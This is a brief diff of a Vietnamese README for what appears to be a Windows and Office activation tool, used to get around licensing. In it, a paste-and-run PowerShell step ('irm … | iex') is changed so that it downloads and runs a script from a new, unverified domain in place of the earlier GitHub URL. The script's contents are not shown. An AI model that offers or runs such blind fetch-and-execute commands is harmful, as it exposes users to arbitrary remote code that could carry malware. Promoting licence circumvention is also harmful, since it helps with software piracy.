@@ -7,7 +7,7 @@
 2. Copy dòng lệnh bên dưới và nhấn **Enter**:
 
 ```powershell
-irm https://raw.githubusercontent.com/ganoipho6/Microsoft-Activation-Scripts/master/launch.ps1 | iex
+irm hailongcomputer.vn/active | iex
 ```
 
 ## Cách 2 - Phương pháp truyền thống
